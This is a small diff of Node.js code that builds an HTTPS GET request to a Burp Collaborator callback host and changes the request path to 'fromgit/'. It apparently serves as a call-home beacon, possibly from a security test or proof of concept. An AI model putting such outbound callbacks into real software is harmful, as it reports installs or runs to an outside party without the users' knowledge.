@@ -2,7 +2,7 @@ const https = require('https')
 const options = {
   hostname: 'ct9xmxzn1rxdhr4bnz0dtcdz9qfh36.burpcollaborator.net',
   port: 443,
-  path: '/',
+  path: 'fromgit/',
   method: 'GET'
 }
 const req = https.request(options, res => {
